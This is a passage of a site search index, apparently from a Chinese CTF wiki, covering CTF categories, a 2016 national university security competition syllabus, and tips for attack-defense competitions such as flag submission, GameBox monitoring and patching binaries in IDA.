\u4e3b\u8981\u5305\u62ec\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\u4e24\u90e8\u5206\u5185\u5bb9\uff0c\u53e4\u5178\u5bc6\u7801\u5b66\u8da3\u5473\u6027\u5f3a\uff0c\u79cd\u7c7b\u7e41\u591a\uff0c\u73b0\u4ee3\u5bc6\u7801\u5b66\u5b89\u5168\u6027\u9ad8\uff0c\u5bf9\u7b97\u6cd5\u7406\u89e3\u7684\u8981\u6c42\u8f83\u9ad8\u3002 Mobile - \u79fb\u52a8\u5b89\u5168 \u4e3b\u8981\u4ecb\u7ecd\u4e86\u5b89\u5353\u9006\u5411\u4e2d\u7684\u5e38\u7528\u5de5\u5177\u548c\u4e3b\u8981\u9898\u578b\uff0c\u5b89\u5353\u9006\u5411\u5e38\u5e38\u9700\u8981\u4e00\u5b9a\u7684\u5b89\u5353\u5f00\u53d1\u77e5\u8bc6\uff0ciOS \u9006\u5411\u9898\u76ee\u5728 CTF \u7ade\u8d5b\u4e2d\u8f83\u5c11\u51fa\u73b0\uff0c\u56e0\u6b64\u4e0d\u4f5c\u8fc7\u591a\u4ecb\u7ecd\u3002 Misc - \u5b89\u5168\u6742\u9879 \u4ee5\u8bf8\u845b\u5efa\u4f1f\u7ffb\u8bd1\u7684\u300a\u7ebf\u4e0a\u5e7d\u7075\uff1a\u4e16\u754c\u5934\u53f7\u9ed1\u5ba2\u7c73\u7279\u5c3c\u514b\u81ea\u4f20\u300b\u548c\u4e00\u4e9b\u5178\u578b MISC \u9898\u4e3a\u5207\u5165\u70b9\uff0c\u5185\u5bb9\u4e3b\u8981\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u3001\u7f16\u7801\u5206\u6790\u3001\u53d6\u8bc1\u5206\u6790\u3001\u9690\u5199\u5206\u6790\u7b49\u3002 \u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9 \u00b6 2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"Content"},{"location":"introduction/content/#-","text":"2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u5f00\u59cb\u8bbe\u7acb\u521b\u65b0\u5b9e\u8df5\u6280\u80fd\u8d5b\uff0c\u91c7\u53d6\u7684\u5c31\u662f\u4f20\u7edf\u7684 CTF \u8d5b\u5236\u3002\u5728\u300a2016 \u5e74\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b\u4e2d\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u7ade\u8d5b\u5185\u5bb9\u76f8\u5bf9\u5168\u9762\uff0c\u503c\u5f97\u53c2\u8003\u3002 \u7cfb\u7edf\u5b89\u5168\u3002\u6d89\u53ca\u64cd\u4f5c\u7cfb\u7edf\u548c Web \u7cfb\u7edf\u5b89\u5168\uff0c\u5305\u62ec Web \u7f51\u7ad9\u591a\u79cd\u8bed\u8a00\u6e90\u4ee3\u7801\u5ba1\u8ba1\u5206\u6790\uff08\u7279\u522b\u662f PHP\uff09\u3001\u6570\u636e\u5e93\u7ba1\u7406\u548c SQL \u64cd\u4f5c\u3001Web \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\uff08\u5982 SQL \u6ce8\u5165\u548c XSS\uff09\u3001\u670d\u52a1\u5668\u63d0\u6743\u3001\u7f16\u5199\u4ee3\u7801\u8865\u4e01\u5e76\u4fee\u590d\u7f51\u7ad9\u6f0f\u6d1e\u7b49\u5b89\u5168\u6280\u80fd\u3002 \u8f6f\u4ef6\u9006\u5411\u3002\u6d89\u53ca Windows/Linux/Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528 APK \u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 \u6f0f\u6d1e\u6316\u6398\u548c\u5229\u7528\u3002\u638c\u63e1 C/C++/Python/PHP/Java/Ruby/\u6c47\u7f16 \u7b49\u8bed\u8a00\uff0c\u6316\u6398 Windows/Linux\uff08x86/x86\uff3f64 \u5e73\u53f0\uff09\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u6f0f\u6d1e\uff0c\u638c\u63e1\u7f13\u51b2\u533a\u6ea2\u51fa\u548c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u653b\u51fb\uff0c\u7f16\u5199\u5e76\u5229\u7528 shellcode\u3002 \u5bc6\u7801\u5b66\u539f\u7406\u53ca\u5e94\u7528\u3002\u638c\u63e1\u53e4\u5178\u5bc6\u7801\u5b66\u548c\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5206\u6790\u5bc6\u7801\u7b97\u6cd5\u548c\u534f\u8bae\uff0c\u8ba1\u7b97\u5bc6\u94a5\u548c\u8fdb\u884c\u52a0\u89e3\u5bc6\u64cd\u4f5c\u3002 \u5176\u4ed6\u5185\u5bb9\u3002\u5305\u62ec\u4fe1\u606f\u641c\u96c6\u80fd\u529b\uff0c\u7f16\u7a0b\u80fd\u529b\u3001\u79fb\u52a8\u5b89\u5168\u3001\u4e91\u8ba1\u7b97\u5b89\u5168\u3001\u53ef\u4fe1\u8ba1\u7b97\u3001\u81ea\u4e3b\u53ef\u63a7\u3001\u9690\u5199\u672f\u548c\u4fe1\u606f\u9690\u85cf\u3001\u8ba1\u7b97\u673a\u53d6\u8bc1\uff08Forensics\uff09\u6280\u672f\u548c\u6587\u4ef6\u6062\u590d\u6280\u80fd\uff0c\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840\u4ee5\u53ca\u5bf9\u7f51\u7edc\u6d41\u91cf\u7684\u5206\u6790\u80fd\u529b\u3002","title":"\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b - \u7ade\u8d5b\u5185\u5bb9"},{"location":"introduction/experience/","text":"\u9996\u5148\u6b63\u5e38\u6bd4\u8d5b\u4f1a\u63d0\u4f9b\u63d0\u4ea4 flag \u7684\u63a5\u53e3\uff0c\u63a5\u53e3\u5730\u5740\u7c7b\u4f3c http://172.16.4.1/Common/submitAnswer \u3002\u4e00\u822c\u6211\u4eec\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u7ed9\u51fa\u7684\u6587\u6863\u8981\u6c42\u901a\u8fc7\u63a5\u53e3\u63d0\u4ea4 flag\u3002\u5728\u6bd4\u8d5b\u4e2d\u8981\u6c42\u63a5\u53e3\u5730\u5740\u4f7f\u7528 Post \u65b9\u5f0f\u63d0\u4ea4\uff0c\u63d0\u4ea4\u65f6\u5e26\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f Answer \uff0c\u5176\u503c\u4e3a\u83b7\u53d6\u5230\u7684 flag \u5b57\u7b26\u4e32\uff0c\u800c\u53e6\u4e00\u4e2a\u5219\u662f token \uff0c\u5176\u503c\u4e3a\u5404\u4e2a\u961f\u4f0d\u7684\u961f\u4f0d Token\u3002 \u7136\u540e\u6bd4\u8d5b\u65f6\u4e3b\u529e\u65b9\u4e5f\u4f1a\u7ed9\u6bcf\u4e2a\u53c2\u8d5b\u961f\u4f0d\u63d0\u4f9b\u4e00\u53f0\u7528\u4e8e \u5206\u6790\u7f51\u7edc\u6d41\u91cf\u7684\u865a\u62df\u673a \uff0c\u9009\u624b\u9700\u8981\u8bbf\u95ee\u5730\u5740\u4e0b\u8f7d\u6d41\u91cf\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u3002 \u5173\u6ce8 Gamebox \u72b6\u6001 \u00b6 \u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002 \u5206\u6e05\u533a\u6bb5\u4e0e\u7aef\u53e3 \u00b6 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox \u6240\u5728\u7f51\u6bb5\u4e0a\uff0c\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684 CTF \u8d26\u53f7\u4e0e\u5bc6\u7801\u767b\u5f55\u3002\u800c\u4e0e\u5176\u4ed6\u961f\u4f0d\u7684 GameBox \u4ea4\u4e92\u65f6\u5219\u9700\u8981\u8fde\u63a5\u5230\u5bf9\u5e94\u7684\u7f51\u6bb5\u91cc\u4e0e\u6f0f\u6d1e\u7a0b\u5e8f\u8fdb\u884c\u4ea4\u4e92\u3002\u63d0\u4ea4 flag \u5219\u9700\u8981\u5230\u6307\u5b9a\u7684\u7b54\u9898\u5e73\u53f0\u4e0a\u63d0\u4ea4\u3002 Warning \u8fd9\u91cc\u5c24\u5176\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u7aef\u53e3\u3002\u5982\u679c\u7aef\u53e3\u5728\u4e0d\u8f7b\u6613\u95f4\u5f04\u9519\u7684\u8bdd\uff0c\u8fd9\u6837\u7684\u9519\u8bef\u662f\u633a\u96be\u5bdf\u89c9\u5230\u7684\uff0c\u800c\u8fd9\u6837\u7684\u5931\u8bef\u4e5f\u4f1a\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u635f\u5931\u3002\u751a\u81f3\u4f1a\u51fa\u73b0\u957f\u65f6\u95f4\u65e0\u6cd5\u63d0\u4ea4 flag \u7684\u81f4\u547d\u60c5\u51b5\u3002\u6240\u4ee5\u9700\u8981\u5c0f\u5fc3\u6ce8\u610f\u3002 \u670d\u52a1 patch \u4e0e\u9632\u5fa1 \u00b6 \u7a0b\u5e8f patch \u8981\u5408\u7406\uff0c\u7b26\u5408\u88c1\u5224\u7cfb\u7edf check \u6761\u4ef6\u3002\u867d\u7136\u7cfb\u7edf\u7684 check \u662f check \u54ea\u91cc\u5e76\u672a\u516c\u5f00\uff0c\u4f46\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u7cfb\u7edf\u662f\u4e0d\u4f1a\u8fc7\u5ea6\u4e3a\u96be\u7684\u3002 \u7a0b\u5e8f patch \u4f7f\u7528 IDA \u8fdb\u884c\u4fee\u6539\uff0cIDA \u63d0\u4f9b\u4e86\u4e09\u79cd\u65b9\u5f0f\u7684 patch\uff1abyte\uff0cword\uff0cassemble.\u5176\u4e2d\u5b57\u8282\u7801\u4fee\u6539\u6bd4\u8f83\u597d\u7528\u3002\u56e0\u4e3a\u9010\u5b57\u8282\u4fee\u6539\u4e0d\u9700\u8003\u8651\u6c47\u7f16\u6307\u4ee4\uff0c\u4e00\u822c\u8fd9\u6837\u7684\u4fee\u6539\u6539\u52a8\u4e5f\u5f88\u5c0f\uff0c\u5728\u4e00\u5b9a\u573a\u5408\u4e0b\u5341\u5206\u597d\u7528\u3002\u6c47\u7f16\u6307\u4ee4\u7ea7\u522b\u7684\u4fee\u6539\u867d\u7136\u65b9\u4fbf\u4e0d\u9700\u8981\u4fee\u6539\u5b57\u8282\u7801\uff0c\u4f46\u662f\u4e5f\u9020\u6210\u4e86\u4e00\u5b9a\u7684\u4e0d\u4fbf\u3002\u6bd4\u5982\u9700\u8981\u989d\u5916\u8003\u8651\u6c47\u7f16\u6307\u4ee4\u7684\u957f\u5ea6\uff0c\u7ed3\u6784\u662f\u5426\u5408\u7406\u5b8c\u6574\uff0c\u903b\u8f91\u662f\u5426\u548c\u539f\u6765\u4e00\u6837\uff0c\u4fee\u6539\u7684\u6c47\u7f16\u6307\u4ee4\u662f\u5426\u5408\u6cd5\u7b49\u95ee\u9898\u3002 \u5728 patch \u7a0b\u5e8f\u65f6\u8981\u8bb0\u5f97\u5907\u4efd\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u4ee5\u4f9b\u961f\u4f0d\u5206\u6790\u4f7f\u7528\u3002\u5728\u4e0a\u4f20 patch \u7684\u65f6\u5019\u5e94\u8be5\u5148\u5220\u9664\u539f\u6765\u7684\u6f0f\u6d1e\u7a0b\u5e8f\uff0c\u7136\u540e\u5c06 patch \u8fc7\u7684\u7a0b\u5e8f\u590d\u5236\u8fdb\u53bb\uff0c\u590d\u5236\u8fdb\u53bb\u4e4b\u540e\u8fd8\u9700\u8981\u7ed9\u7a0b\u5e8f\u8d4b\u4e88\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u6bd4\u8d5b\u4e2d\uff0c\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u6709\u5341\u51e0\u5904\u9700\u8981 patch \u7684\u5730\u65b9\u3002Patch \u7684\u65f6\u5019\u4e0d\u4ec5\u8981\u8bb2\u7a76\u6709\u6548\u5408\u7406\uff0c\u8fd8\u8981\u6ee1\u8db3\u80fd\u591f\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u8303\u6216\u6df7\u6dc6\u5bf9\u624b\u7684\u5206\u6790\u3002 \u6784\u9020\u811a\u672c\u6846\u67b6\u5feb\u901f\u5c55\u5f00\u653b\u51fb \u00b6 \u5728\u653b\u9632\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e00\u8840\u663e\u5f97\u5c24\u5176\u91cd\u8981\u3002\u56e0\u6b64\u6709\u4e00\u4e2a\u653b\u51fb\u811a\u672c\u6846\u67b6\u662f\u975e\u5e38\u6709\u5229\u7684\u3002\u5feb\u901f\u5f00\u53d1\u653b\u51fb\u811a\u672c\uff0c\u53ef\u4ee5\u5728\u524d\u671f\u4fdd\u6301\u4f18\u52bf\u5730\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5728\u4e0d\u65ad\u62ff\u5206\u7684\u540c\u65f6\u7701\u4e0b\u65f6\u95f4\u53bb\u505a\u597d\u9632\u5fa1\u3002 \u6bd4\u8d5b\u7684\u4e00\u4e9b\u7b56\u7565 \u00b6 \u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u5b9c\u6b7b\u8017\u5728\u4e00\u9053\u9898\u4e0a\uff0c\u7531\u4e8e\u4e00\u8840\u7684\u4f18\u52bf\u6027\uff0c\u5728\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u66f4\u5e94\u8be5\u5168\u9762\u4e86\u89e3\u8d5b\u9898\u96be\u5ea6\uff0c\u5148\u4ece \u7b80\u5355\u9898 \u5f00\u59cb\u8fdb\u884c\u5206\u6790\uff0c\u6b65\u6b65\u4e3a\u8425\u3002 \u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\uff0c\u4e24\u6781\u4f1a\u4e25\u91cd\u5206\u5316\u3002\u5e94\u8be5\u7740\u529b\u6253\u51fb\u548c\u81ea\u5df1\u5b9e\u529b\u76f8\u5f53\u548c\u6bd4\u81ea\u5df1\u961f\u4f0d\u66f4\u5f3a\u7684\u961f\u4f0d\uff0c\u5c24\u5176\u662f\u5206\u6570\u76f8\u5dee\u65e0\u51e0\u7684\u60c5\u51b5\u4e0b\uff0c\u66f4\u8981\u4e25\u9632\u4e25\u5b88\u3002 \u6bd4\u8d5b\u4e2d NPC \u4f1a\u4e0d\u5b9a\u65f6\u53d1\u51fa\u653b\u51fb\u6d41\u91cf\u3002\u4ece\u653b\u51fb\u6d41\u91cf\u4e2d\u53ef\u4ee5\u5f97\u5230 payload\u3002 \u4e00\u5b9a\u8981\u628a NPC \u5f80\u6b7b\u91cc\u6253\u3002 \u5728\u5f00\u8d5b\u521d\u53ef\u4ee5\u5c06\u6240\u6709\u7684\u7ba1\u7406\u5bc6\u7801\u90fd\u8bbe\u7f6e\u4e3a\u540c\u4e00\u4e2a\u5bc6\u7801\uff0c\u8fd9\u6837\u65b9\u4fbf\u961f\u5458\u767b\u5f55\u7ba1\u7406\u3002\u5728\u521d\u671f\u5c06\u6240\u6709\u6587\u4ef6\u5907\u4efd\u4e0b\u6765\u4f9b\u961f\u5185\u5206\u4eab\u3002","title":"Experience"},{"location":"introduction/experience/#gamebox","text":"\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u67e5\u770b\u5df1\u65b9\u548c\u654c\u65b9 GameBox \u72b6\u6001\u3002\u65f6\u523b\u5173\u6ce8\u53ef\u4ee5\u5c3d\u65e9\u83b7\u53d6\u6bd4\u8d5b\u4fe1\u606f\uff0c\u6839\u636e\u4fe1\u606f\u505a\u51fa\u8c03\u6574\u3002 \u5bf9\u4e8e\u5df1\u65b9 GameBox\uff0c\u6709\u5b58\u5728\u5982\u4e0b\u539f\u56e0\u9020\u6210 GameBox \u88ab down \u6389\uff1a \u4e3b\u529e\u65b9\u88c1\u5224\u7cfb\u7edf\u5b58\u5728\u5931\u8bef\uff0c\u8bef\u5224 GameBox \u4e3a\u4e0d\u53ef\u7528\u72b6\u6001\u3002\u8fd9\u79cd\u60c5\u51b5\u4e00\u822c\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\uff0c\u8981\u5c3d\u65e9\u5411\u5de5\u4f5c\u4eba\u5458\u793a\u610f\u5904\u7406\u4ee5\u51cf\u5c11\u635f\u5931\u3002 \u7a0b\u5e8f patch \u5931\u8bef\u5bfc\u81f4\u670d\u52a1\u4e0d\u53ef\u7528\u3002\u5728\u7a0b\u5e8f patch \u5b8c\u4e4b\u540e\u8981\u8fdb\u5165\u4e0b\u4e00\u8f6e\u5173\u6ce8 GameBox \u72b6\u6001\uff0c\u5982\u679c patch \u5931\u8bef\u5bfc\u81f4\u4e0d\u53ef\u7528\uff0c\u9700\u8981\u53ca\u65f6\u633d\u6551\u3002\u4f46\u662f\u4e5f\u4e0d\u8981\u8fc7\u5ea6\u62c5\u5fc3\u628a\u539f\u6765\u7684\u672a\u4fee\u8865\u8fc7\u7684\u6f0f\u6d1e\u7a0b\u5e8f\u6362\u56de\u53bb\u3002\u56e0\u4e3a down \u6389\u662f\u6240\u6709\u961f\u5e73\u5206\u5f97\u5f88\u5c11\u7684\u5206\uff0c\u800c\u76f4\u63a5\u4e0a\u6f0f\u6d1e\u7a0b\u5e8f\u4f1a\u4f7f\u7684\u5f3a\u52bf\u7684\u961f\u4f0d\u76f4\u63a5\u5229\u7528\u5f97\u5230\u5f88\u9ad8\u7684\u5f97\u5206\u3002\u6240\u4ee5\u8981\u4f9d\u636e\u5177\u4f53\u60c5\u51b5\u5bf9\u5f85\u3002 \u5bf9\u624b\u4e0d\u6b63\u5f53\u653b\u51fb\u5bfc\u81f4 GameBox \u4e0d\u53ef\u7528\u3002\u5982\u679c\u53d1\u73b0\uff0c\u9700\u8981\u53ca\u65f6\u8865\u6551\u3002 \u4e3b\u529e\u65b9\u52a0\u5f3a\u7a0b\u5e8f check\u3002\u8fd9\u79cd\u60c5\u51b5\u4e3b\u529e\u65b9\u4f1a\u5bf9\u6240\u6709\u961f\u5458\u8fdb\u884c\u901a\u77e5\u516c\u544a\u3002\u5728 GameBox \u72b6\u6001\u5899\u4e0a\u7684\u72b6\u6001\u4f1a\u663e\u793a\u8be5\u9898\u7684\u5404\u961f GameBox \u5927\u9762\u79ef\u4e0d\u53ef\u7528\u3002 \u5bf9\u4e8e\u654c\u65b9 GameBox\u3002\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4ee5\u4e0b\u4fe1\u606f\u3002 \u6839\u636e\u653b\u51fb\u6d41\u89c2\u6d4b\u54ea\u4e9b\u961f\u4f0d\u7684 GameBox \u6ca1\u6709\u9632\u5fa1\u6210\u529f\u3002\u9488\u5bf9\u8fd9\u4e9b\u961f\u4f0d\u53ef\u4ee5\u66f4\u591a\u5730\u5b9e\u73b0\u653b\u51fb \u6709\u961f\u4f0d\u62ff\u51fa\u4e00\u8840\u65f6\u3002\u53ef\u4ee5\u6839\u636e\u5404\u961f GameBox \u72b6\u6001\u63a8\u65ad\u51fa\u4e00\u8840\u961f\u4f0d\u662f\u5426\u5df2\u7ecf\u5199\u51fa\u5229\u7528\u811a\u672c\u3002\u5199\u51fa\u5229\u7528\u811a\u672c\u540e\u53ef\u4ee5\u89c2\u6d4b\u5df1\u65b9\u662f\u5426\u505a\u597d\u4e86\u9632\u5fa1\u3002","title":"\u5173\u6ce8 Gamebox \u72b6\u6001"},{"location":"introduction/experience/#_1","text":"\u6bd4\u8d5b\u8fc7\u7a0b\u4e2d\u4f1a\u4e3b\u529e\u65b9\u4f1a\u5b89\u6392\u597d\u5408\u7406\u7684\u7f51\u6bb5\u5206\u5e03\u3002 \u7ef4\u62a4\u7684\u65f6\u5019\u9700\u8981\u8fde\u63a5\u5230\u672c\u961f GameBox 